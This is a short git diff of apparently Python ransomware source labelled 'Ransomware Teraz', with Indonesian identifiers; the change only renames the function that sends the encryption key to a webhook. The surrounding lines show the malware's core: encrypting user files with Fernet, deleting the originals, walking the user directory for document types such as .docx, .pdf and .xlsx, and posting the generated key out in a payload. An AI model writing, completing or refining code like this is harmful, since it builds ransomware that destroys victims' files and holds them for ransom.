@@ -15,7 +15,7 @@ def enkripsi_file(file_path, key):
         file.write(encrypted_data)
     os.remove(file_path)
 
-def kirim_kunci_ke_webhook(key):
+def send_key(key):
     payload = {
         "content": f"KEY: {key.decode()}",
         "username": "Ransomware Teraz"
@@ -25,7 +25,7 @@ def kirim_kunci_ke_webhook(key):
 
 key = Fernet.generate_key()
 
-kirim_kunci_ke_webhook(key)
+send_key(key)
 
 ekstensi_tertentu = ['.txt', '.docx', '.docm', '.dotx', '.dotm', '.xlsx', '.pptx', '.pdf', '.doc', '.xls']
 for root, dirs, files in os.walk(USER_DIR):
